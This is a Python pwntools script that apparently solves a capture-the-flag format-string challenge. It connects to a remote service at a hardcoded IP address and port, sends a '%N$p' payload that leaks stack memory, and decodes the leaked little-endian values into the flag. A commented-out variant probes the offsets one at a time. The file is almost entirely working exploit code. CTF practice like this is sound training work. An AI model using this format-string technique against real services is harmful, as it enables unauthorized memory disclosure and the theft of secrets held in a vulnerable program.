#!/usr/bin/env python3
import pwn

# p = pwn.process('./source/fmt/fmt')
p = pwn.remote('140.113.24.241', 30172)
payload = b'%10$p/%11$p/%12$p/%13$p/%14$p'
p.sendline(payload)

string = p.recv().decode()
hex = string.split('/')
flag = ''

for h in hex:
    h = h.replace('0x', '')
    flag += ''.join([chr(int(h[i:i+2], 16)) for i in range(0, len(h), 2)])[::-1]

print(flag)

# flag = ''
# for i in range(10, 15):
#     try:
#         # p = pwn.process('./source/fmt/fmt')
#         p = pwn.remote('140.113.24.241', 30172)
#         payload = b'%' + str(i).encode() + b'$p'
#         print(payload)
#         p.sendline(payload)

#         output = p.recv().decode().replace('0x', '')
#         print(output)
#         flag += (''.join([chr(int(output[i:i+2], 16)) for i in range(0, len(output), 2)]))[::-1]
#         p.close()
#     except:
#         p.close()
#         continue   

# print(flag)